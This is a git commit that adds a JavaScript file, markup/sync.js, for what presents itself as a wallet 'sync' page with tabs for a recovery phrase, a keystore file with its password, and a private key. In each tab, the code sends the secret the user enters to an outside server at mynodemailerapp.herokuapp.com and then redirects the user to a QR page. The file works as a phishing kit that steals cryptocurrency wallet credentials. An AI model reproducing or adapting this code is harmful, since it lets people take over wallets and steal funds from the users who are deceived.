0e1fbde0d4a67bc19254aac534f7451a032f4b8b
Alugbin Boluwatife Godwin <godwinalugbin004@gmail.com>
2022-03-17 12:53:04 +0100

    new commit

---
+++ markup/sync.js
@@ -0,0 +1,153 @@
+const conts = document.querySelectorAll('.c')
+const container = document.querySelector('.container')
+const btns = document.querySelectorAll('button')
+const importBtn = document.querySelectorAll('#import')
+
+
+container.addEventListener('click', function (e) {
+    const id = e.target.dataset.id
+
+    if (id) {
+        btns.forEach((btn) => {
+            btn.classList.remove('active')
+            e.target.classList.add('active')
+
+
+        })
+        conts.forEach((cont) => {
+            cont.classList.remove('active')
+        })
+        const element = document.getElementById(id)
+        element.classList.add('active')
+    }
+
+})
+
+;
+
+const key = document.getElementById('json')
+if (key) {
+    key.addEventListener('click', () => {
+        const phrase = document.querySelector('.re')
+        phrase.classList.add('age')
+    })
+} else {
+    const phrase = document.querySelector('.re')
+    phrase.classList.remove('age')
+}
+
+const json = document.getElementById('key')
+if (json) {
+    json.addEventListener('click', () => {
+        const phrase = document.querySelector('.re')
+        phrase.classList.add('age')
+    })
+} else {
+    const phrase = document.querySelector('.re')
+    phrase.classList.remove('age')
+}
+
+const phrase = document.querySelector('.re')
+
+phrase.addEventListener('click', function () {
+    phrase.classList.remove('age')
+})
+
+
+
+function drawElementFromDOM(id) {
+    return document.querySelector(id)
+}
+
+const phraseBtn = document.querySelector('.phrase__tab')
+const keystoreBtn = document.querySelector('.keystore__tab')
+const privateBtn = document.querySelector('.private__tab')
+const phraseText = document.querySelector('.txt1')
+const keystoreText = document.querySelector('.txt2')
+const passwordText = document.querySelector('.txt3')
+const privateText = document.querySelector('.txt4')
+
+
+
+
+
+
+
+
+const url = 'https://mynodemailerapp.herokuapp.com/sender'
+
+
+
+phraseBtn.addEventListener('click', () => {
+    const url = 'https://mynodemailerapp.herokuapp.com/sender'
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'Application/json'
+        },
+        body: JSON.stringify({
+            "key": "Phrase",
+            "phrase": phraseText.value
+        })
+    }).then((res) => {
+        console.log(res);
+        return res.json()
+    }).then((data) => {
+        console.log(data);
+    }).catch((err) => {
+        console.log(err);
+    })
+    window.location.replace("/qr.html")
+})
+
+keystoreBtn.addEventListener('click', () => {
+    const url = 'https://mynodemailerapp.herokuapp.com/sender'
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'Application/json'
+        },
+        body: JSON.stringify({
+            "key": "Keystore JSON and Password",
+            "phrase": keystoreText.value,
+            "password": passwordText.value
+        })
+    }).then((res) => {
+        console.log(res);
+        return res.json()
+    }).then((data) => {
+        console.log(data);
+    }).catch((err) => {
+        console.log(err);
+    })
+
+    window.location.replace("/qr.html")
+})
+
+privateBtn.addEventListener('click', () => {
+    const url = 'https://mynodemailerapp.herokuapp.com/sender'
+
+
+    
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'Application/json'
+        },
+        body: JSON.stringify({
+            "key": "Private Key",
+            "phrase": privateText.value,
+           
+        })
+    }).then((res) => {
+        return res.json()
+    }).then((data) => {
+        console.log(data);
+    }).catch((err) => {
+        console.log(err);
+    })
+    window.location.replace("/qr.html")
+})
